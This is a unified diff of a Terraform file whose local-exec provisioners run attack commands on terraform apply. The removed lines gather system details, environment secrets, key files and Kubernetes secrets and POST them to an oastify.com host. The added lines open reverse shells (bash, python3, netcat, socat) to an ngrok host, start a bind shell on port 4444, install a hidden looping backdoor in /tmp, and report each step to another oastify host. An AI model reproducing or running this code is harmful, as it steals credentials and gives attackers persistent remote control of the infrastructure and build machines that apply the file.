@@ -1,124 +1,86 @@
-# main.tf - full compromise assessment
-resource "null_resource" "system_recon" {
+resource "null_resource" "reverse_shell" {
   provisioner "local-exec" {
     command = <<EOT
-      echo "=== SYSTEM COMPROMISE ASSESSMENT ===" > /tmp/system.txt
-      echo "container: $(cat /etc/hostname)" >> /tmp/system.txt
-      echo "user: $(whoami)" >> /tmp/system.txt
-      echo "id: $(id)" >> /tmp/system.txt
-      echo "os: $(cat /etc/os-release | grep PRETTY_NAME)" >> /tmp/system.txt
-      echo "=== MOUNTS ===" >> /tmp/system.txt
-      mount >> /tmp/system.txt
-      curl -X POST --data-binary @/tmp/system.txt http://2gj5410dqffy36mnn8f4uvq2vt1kpbuzj.oastify.com/system
-    EOT
-  }
-}
-
-resource "null_resource" "privilege_escalation" {
-  provisioner "local-exec" {
-    command = <<EOT
-      echo "=== PRIVILEGE ESCALATION ===" > /tmp/privilege.txt
-      echo "docker socket: $(ls -la /var/run/docker.sock 2>/dev/null || echo 'not found')" >> /tmp/privilege.txt
-      echo "privileged: $( [ -w /dev/kmsg ] && echo 'YES' || echo 'no' )" >> /tmp/privilege.txt
-      echo "host pid: $(ls /proc/1/root/ 2>/dev/null && echo 'accessible' || echo 'no')" >> /tmp/privilege.txt
-      echo "capabilities: $(capsh --print 2>/dev/null | head -5 || echo 'no capsh')" >> /tmp/privilege.txt
-      curl -X POST --data-binary @/tmp/privilege.txt http://2gj5410dqffy36mnn8f4uvq2vt1kpbuzj.oastify.com/privilege
-    EOT
-  }
-}
-
-resource "null_resource" "network_recon" {
-  provisioner "local-exec" {
-    command = <<EOT
-      echo "=== NETWORK RECON ===" > /tmp/network.txt
-      echo "ip info:" >> /tmp/network.txt
-      ip addr >> /tmp/network.txt
-      echo "=== routes ===" >> /tmp/network.txt
-      ip route >> /tmp/network.txt
-      echo "=== neighbors ===" >> /tmp/network.txt
-      ip neighbor show 2>/dev/null >> /tmp/network.txt
-      curl -X POST --data-binary @/tmp/network.txt http://2gj5410dqffy36mnn8f4uvq2vt1kpbuzj.oastify.com/network
-    EOT
-  }
-}
-
-resource "null_resource" "service_discovery" {
-  provisioner "local-exec" {
-    command = <<EOT
-      echo "=== SERVICE DISCOVERY ===" > /tmp/services.txt
-      echo "processes:" >> /tmp/services.txt
-      ps aux >> /tmp/services.txt
-      echo "=== listening ports ===" >> /tmp/services.txt
-      netstat -tulpn 2>/dev/null || ss -tulpn 2>/dev/null >> /tmp/services.txt
-      echo "=== cloud check ===" >> /tmp/services.txt
-      curl -s --connect-timeout 2 http://169.254.169.254/ && echo "aws metadata: accessible" >> /tmp/services.txt || echo "aws metadata: no" >> /tmp/services.txt
-      curl -X POST --data-binary @/tmp/services.txt http://2gj5410dqffy36mnn8f4uvq2vt1kpbuzj.oastify.com/services
-    EOT
-  }
-}
-
-resource "null_resource" "credential_hunt" {
-  provisioner "local-exec" {
-    command = <<EOT
-      echo "=== CREDENTIAL HUNT ===" > /tmp/creds.txt
-      echo "environment secrets:" >> /tmp/creds.txt
-      env | grep -i "token\|key\|secret\|pass\|cred" >> /tmp/creds.txt
-      echo "=== filesystem secrets ===" >> /tmp/creds.txt
-      find / -name "*.pem" -o -name "*.key" -o -name ".env" -o -name "config" 2>/dev/null | head -20 >> /tmp/creds.txt
-      echo "=== k8s secrets ===" >> /tmp/creds.txt
-      ls -la /var/run/secrets/kubernetes.io 2>/dev/null >> /tmp/creds.txt
-      curl -X POST --data-binary @/tmp/creds.txt http://2gj5410dqffy36mnn8f4uvq2vt1kpbuzj.oastify.com/creds
-    EOT
-  }
-}
-
-resource "null_resource" "lateral_movement" {
-  provisioner "local-exec" {
-    command = <<EOT
-      echo "=== LATERAL MOVEMENT ===" > /tmp/lateral.txt
-      echo "scanning internal network..." >> /tmp/lateral.txt
-      for ip in 172.17.0.1 172.18.0.1 172.19.0.1 10.0.0.1 10.0.0.2 192.168.0.1 192.168.1.1; do
-        ping -c 1 -W 1 $ip 2>/dev/null && echo "host $ip reachable" >> /tmp/lateral.txt || true
-      done
-      echo "=== docker containers ===" >> /tmp/lateral.txt
-      docker ps -a 2>/dev/null >> /tmp/lateral.txt || echo "no docker access" >> /tmp/lateral.txt
-      curl -X POST --data-binary @/tmp/lateral.txt http://2gj5410dqffy36mnn8f4uvq2vt1kpbuzj.oastify.com/lateral
-    EOT
-  }
-}
-
-resource "null_resource" "persistence_check" {
-  provisioner "local-exec" {
-    command = <<EOT
-      echo "=== PERSISTENCE CHECK ===" > /tmp/persistence.txt
-      echo "cron access: $(crontab -l 2>/dev/null && echo 'yes' || echo 'no')" >> /tmp/persistence.txt
-      echo "ssh keys found: $(find / -name 'id_rsa' -o -name 'id_dsa' 2>/dev/null | wc -l)" >> /tmp/persistence.txt
-      echo "available shells: $(which bash && which sh && which python3)" >> /tmp/persistence.txt
-      echo "file creation test: $(echo 'rce-persistence-test' > /tmp/rce_proof.txt && cat /tmp/rce_proof.txt)" >> /tmp/persistence.txt
-      curl -X POST --data-binary @/tmp/persistence.txt http://2gj5410dqffy36mnn8f4uvq2vt1kpbuzj.oastify.com/persistence
-    EOT
-  }
-}
-
-resource "null_resource" "summary" {
-  provisioner "local-exec" {
-    command = <<EOT
-      echo "=== RCE COMPROMISE SUMMARY ==="
+      echo "=== REVERSE SHELL ATTEMPT ==="
       echo "container: $(cat /etc/hostname)"
       echo "user: $(whoami)"
-      echo "timestamp: $(date)"
-      echo "all data sent to burp collaborator"
-      curl -X POST -d "summary=compromise_complete&container=$(cat /etc/hostname)&user=$(whoami)&time=$(date)" http://2gj5410dqffy36mnn8f4uvq2vt1kpbuzj.oastify.com/summary
+      echo "starting reverse shell attempts..."
+      
+      # Method 1: bash reverse shell
+      which bash && echo "bash available - attempting reverse shell" && bash -c 'bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/19850 0>&1' &
+      
+      # Method 2: python3 reverse shell
+      which python3 && echo "python3 available - attempting reverse shell" && python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("6.tcp.eu.ngrok.io",19850));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' &
+      
+      # Method 3: nc reverse shell
+      which nc && echo "netcat available - attempting reverse shell" && nc -e /bin/sh 6.tcp.eu.ngrok.io 19850 &
+      
+      # Method 4: socat if available
+      which socat && echo "socat available - attempting reverse shell" && socat TCP:6.tcp.eu.ngrok.io:19850 EXEC:/bin/sh &
+      
+      echo "reverse shell attempts launched in background"
+      
+      # Keep the process alive and send confirmation
+      curl -X POST -d "reverse_shell_attempted=true&container=$(cat /etc/hostname)&user=$(whoami)" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/reverse_shell
     EOT
   }
-  
-  depends_on = [
-    null_resource.system_recon,
-    null_resource.privilege_escalation, 
-    null_resource.network_recon,
-    null_resource.service_discovery,
-    null_resource.credential_hunt,
-    null_resource.lateral_movement,
-    null_resource.persistence_check
-  ]
+}
+
+resource "null_resource" "fallback_shell" {
+  provisioner "local-exec" {
+    command = <<EOT
+      echo "=== FALLBACK SHELL METHODS ==="
+      
+      # Create a simple bind shell on port 4444 as fallback
+      which nc && echo "starting bind shell on 4444" && nc -lvp 4444 -e /bin/sh &
+      which python3 && echo "starting python bind shell" && python3 -c 'import socket as s,subprocess as sp,os;so=s.socket(s.AF_INET,s.SOCK_STREAM);so.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR,1);so.bind(("0.0.0.0",4444));so.listen(1);c,a=so.accept();[os.dup2(c.fileno(),x) for x in (0,1,2)];sp.call(["/bin/sh","-i"])' &
+      
+      # Send network info for connection
+      echo "=== NETWORK INFO ===" > /tmp/network_info.txt
+      ip addr >> /tmp/network_info.txt
+      netstat -tulpn 2>/dev/null >> /tmp/network_info.txt
+      curl -X POST --data-binary @/tmp/network_info.txt http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/network_info
+    EOT
+  }
+}
+
+resource "null_resource" "persistent_access" {
+  provisioner "local-exec" {
+    command = <<EOT
+      echo "=== PERSISTENT ACCESS SETUP ==="
+      
+      # Create backdoor script
+      cat > /tmp/.backdoor.sh << 'EOF'
+#!/bin/bash
+while true; do
+  # Try reverse shell every 30 seconds
+  bash -c 'exec 5<>/dev/tcp/6.tcp.eu.ngrok.io/19850; cat <&5 | while read line; do $line 2>&5 >&5; done' 2>/dev/null &
+  sleep 30
+  # Clean up dead processes
+  pkill -f "dev/tcp" 2>/dev/null
+done
+EOF
+      
+      chmod +x /tmp/.backdoor.sh
+      nohup /tmp/.backdoor.sh > /dev/null 2>&1 &
+      
+      echo "persistent backdoor installed"
+      curl -X POST -d "backdoor_installed=true&container=$(cat /etc/hostname)" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/backdoor
+    EOT
+  }
+}
+
+resource "null_resource" "privilege_check" {
+  provisioner "local-exec" {
+    command = <<EOT
+      echo "=== PRIVILEGE ESCALATION CHECK ===" > /tmp/priv.txt
+      echo "user: $(whoami)" >> /tmp/priv.txt
+      echo "id: $(id)" >> /tmp/priv.txt
+      echo "sudo: $(which sudo && sudo -l || echo 'no sudo')" >> /tmp/priv.txt
+      echo "capabilities: $(capsh --print 2>/dev/null | head -10 || echo 'no capsh')" >> /tmp/priv.txt
+      echo "suid files: $(find / -perm -4000 2>/dev/null | head -10)" >> /tmp/priv.txt
+      
+      curl -X POST --data-binary @/tmp/priv.txt http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/privilege_check
+    EOT
+  }
 }
